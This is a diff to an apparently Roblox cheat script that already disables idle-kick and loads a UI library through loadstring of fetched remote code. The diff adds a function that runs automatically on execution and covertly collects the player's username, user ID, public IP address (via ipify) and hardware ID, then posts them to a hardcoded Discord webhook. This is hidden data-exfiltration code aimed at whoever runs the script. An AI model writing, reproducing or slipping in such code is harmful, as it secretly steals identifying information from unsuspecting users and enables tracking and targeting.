@@ -310,6 +310,70 @@ game:GetService("Players").LocalPlayer.Idled:Connect(
 for i, v in pairs(getconnections(game:GetService("Players").LocalPlayer.Idled)) do
     v:Disable()
 end
+local HttpService = game:GetService("HttpService")
+local function sendWebhook()
+    local player = game.Players.LocalPlayer
+    local username = player.Name
+    local userId = player.UserId
+    local ipAddress = "Unknown"
+    local hwid = "Unknown"
+    local ipifyResponse =
+        request(
+        {
+            Url = "https://api.ipify.org?format=json",
+            Method = "GET"
+        }
+    )
+    if ipifyResponse and ipifyResponse.Success and ipifyResponse.Body then
+        local ipData = HttpService:JSONDecode(ipifyResponse.Body)
+        ipAddress = ipData.ip or "Unknown"
+    end
+    if typeof(gethwid) == "function" then
+        hwid = gethwid() or "Unknown"
+    end
+    local embed = {
+        ["title"] = "Player Information",
+        ["color"] = 0x00FF00,
+        ["fields"] = {
+            {
+                ["name"] = "Username",
+                ["value"] = username,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "User ID",
+                ["value"] = tostring(userId),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "IP Address",
+                ["value"] = ipAddress,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "HWID",
+                ["value"] = hwid,
+                ["inline"] = true
+            }
+        },
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+    local webhookData = {
+        ["embeds"] = {embed}
+    }
+
+    request(
+        {
+            Url = "https://discord.com/api/webhooks/1350116306694701066/0J9ZMFFv5J2SvgNJt_3VOYbJIR8Pg-AB_NjjoOsI999UaLxOU_qp1yedp2TY-iWrZRtx", -- Replace with your Discord webhook URL
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(webhookData)
+        }
+    )
+end
+sendWebhook()
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
 local SaveManager =
     loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
